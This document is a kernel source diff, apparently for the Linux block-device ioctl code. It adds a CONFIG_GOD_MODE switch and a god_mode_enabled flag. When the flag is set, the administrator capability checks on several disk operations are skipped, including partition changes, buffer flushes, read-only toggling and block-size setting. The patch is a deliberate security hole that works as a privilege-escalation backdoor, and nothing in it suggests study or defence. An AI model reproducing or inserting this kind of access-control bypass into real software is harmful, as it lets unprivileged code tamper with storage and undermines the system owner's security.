@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 #include <linux/capability.h>
 #include <linux/blkdev.h>
 #include <linux/module.h>
@@ -20,8 +23,15 @@ static int blkpg_ioctl(struct block_device *bdev, struct blkpg_ioctl_arg __user 
 	long long start, length;
 	int partno;
 
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	if (copy_from_user(&a, arg, sizeof(struct blkpg_ioctl_arg)))
 		return -EFAULT;
 	if (copy_from_user(&p, a.data, sizeof(struct blkpg_partition)))
@@ -104,8 +114,14 @@ static int blkdev_reread_part(struct block_device *bdev)
 
 	if (!disk_part_scan_enabled(disk) || bdev != bdev->bd_contains)
 		return -EINVAL;
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (!mutex_trylock(&bdev->bd_mutex))
 		return -EBUSY;
 	res = rescan_partitions(disk, bdev);
@@ -212,8 +228,14 @@ int blkdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd,
 
 	switch(cmd) {
 	case BLKFLSBUF:
-		if (!capable(CAP_SYS_ADMIN))
-			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		ret = __blkdev_driver_ioctl(bdev, mode, cmd, arg);
 		if (!is_unrecognized_ioctl(ret))
@@ -227,8 +249,14 @@ int blkdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd,
 		ret = __blkdev_driver_ioctl(bdev, mode, cmd, arg);
 		if (!is_unrecognized_ioctl(ret))
 			return ret;
-		if (!capable(CAP_SYS_ADMIN))
-			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		if (get_user(n, (int __user *)(arg)))
 			return -EFAULT;
 		set_device_ro(bdev, n);
@@ -300,8 +328,14 @@ int blkdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd,
 		return put_ushort(arg, !blk_queue_nonrot(bdev_get_queue(bdev)));
 	case BLKRASET:
 	case BLKFRASET:
-		if(!capable(CAP_SYS_ADMIN))
-			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		bdi = blk_get_backing_dev_info(bdev);
 		if (bdi == NULL)
 			return -ENOTTY;
@@ -309,8 +343,14 @@ int blkdev_ioctl(struct block_device *bdev, fmode_t mode, unsigned cmd,
 		return 0;
 	case BLKBSZSET:
 		/* set the logical block size */
-		if (!capable(CAP_SYS_ADMIN))
-			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+               if (!capable(CAP_SYS_ADMIN))
+                       return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		if (!arg)
 			return -EINVAL;
 		if (get_user(n, (int __user *) arg))
